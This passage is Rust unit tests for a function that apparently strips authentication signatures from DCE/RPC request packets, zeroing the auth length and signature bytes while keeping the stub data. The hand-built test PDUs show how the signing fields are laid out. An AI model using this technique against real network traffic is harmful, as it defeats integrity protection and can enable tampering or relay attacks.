    fn test_strip_dce_rpc_no_auth_returns_unchanged() {
        let msg = build_dce_rpc_request_without_auth();
        let result = strip_dce_rpc_signature(&msg);

        assert_eq!(result.len(), msg.len());
        let auth_len = u16::from_le_bytes([result[10], result[11]]);
        assert_eq!(auth_len, 0);
    }

    #[test]
    fn test_strip_dce_rpc_short_pdu_returns_original() {
        let data = [0u8; 20];
        let result = strip_dce_rpc_signature(&data);
        assert_eq!(result, data.to_vec());
    }

    #[test]
    fn test_strip_dce_rpc_wrong_version_returns_original() {
        let mut data = vec![0u8; 24];
        data[0] = 0x04;
        data[1] = 0x00;
        let result = strip_dce_rpc_signature(&data);
        assert_eq!(result, data);
    }

    #[test]
    fn test_strip_dce_rpc_wrong_pdu_type_returns_original() {
        let mut data = vec![0u8; 24];
        data[0] = 0x05;
        data[1] = 0x00;
        data[2] = 0x0B;
        let result = strip_dce_rpc_signature(&data);
        assert_eq!(result, data);
    }

    #[test]
    fn test_strip_dce_rpc_malformed_frag_len_returns_original() {
        let mut data = vec![0u8; 24];
        data[0] = 0x05;
        data[1] = 0x00;
        data[2] = 0x00;
        data[8] = 0xFF;
        data[9] = 0xFF;
        let result = strip_dce_rpc_signature(&data);
        assert_eq!(result, data);
    }

    #[test]
    fn test_strip_dce_rpc_auth_too_large_returns_original() {
        let mut data = vec![0u8; 24];
        data[0] = 0x05;
        data[1] = 0x00;
        data[2] = 0x00;
        data[8] = 24;
        data[9] = 0;
        data[10] = 20;
        data[11] = 0;
        let result = strip_dce_rpc_signature(&data);
        assert_eq!(result, data);
    }

    #[test]
    fn test_strip_dce_rpc_auth_too_small_returns_original() {
        let mut data = vec![0u8; 24];
        data[0] = 0x05;
        data[1] = 0x00;
        data[2] = 0x00;
        data[8] = 28;
        data[9] = 0;
        data[10] = 4;
        data[11] = 0;
        let result = strip_dce_rpc_signature(&data);
        assert_eq!(result, data);
    }

    #[test]
    fn test_strip_dce_rpc_preserves_stub_data() {
        let msg = build_dce_rpc_request_with_auth();
        let result = strip_dce_rpc_signature(&msg);

        for i in 0..40 {
            assert_eq!(
                result[24 + i],
                0xAA,
                "Stub data byte {i} should be preserved"
            );
        }
    }

    #[test]
    fn test_strip_dce_rpc_with_padding() {
        let stub_data = vec![0xAA; 40];
        let auth_sig = vec![0xBB; 16];
        let pad_length = 3;

        let mut pdu = Vec::new();
        pdu.extend_from_slice(&[0x05, 0x00]);
        pdu.push(0x00);
        pdu.push(0x03);
        pdu.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]);
        let auth_len = 8 + pad_length + auth_sig.len();
        let frag_len = 24 + stub_data.len() + auth_len;
        pdu.extend_from_slice(&(frag_len as u16).to_le_bytes());
        pdu.extend_from_slice(&(auth_len as u16).to_le_bytes());
        pdu.extend_from_slice(&1u32.to_le_bytes());
        pdu.extend_from_slice(&(stub_data.len() as u32).to_le_bytes());
        pdu.extend_from_slice(&0u16.to_le_bytes());
        pdu.extend_from_slice(&0u16.to_le_bytes());
        pdu.extend_from_slice(&stub_data);
        pdu.push(pad_length as u8);
        pdu.push(0x0A);
        pdu.push(0x05);
        pdu.push(0x00);
        pdu.extend_from_slice(&0u32.to_le_bytes());
        pdu.extend_from_slice(&vec![0xCC; pad_length]);
        pdu.extend_from_slice(&auth_sig);

        let result = strip_dce_rpc_signature(&pdu);

        let auth_len_result = u16::from_le_bytes([result[10], result[11]]);
        assert_eq!(auth_len_result, 0);

        let stub_len = 40;
        let sig_start = 24 + stub_len + 8 + pad_length;
        for i in 0..16 {
            assert_eq!(
                result[sig_start + i],
                0,
                "Signature byte {i} should be zeroed"
            );
        }
    }
}
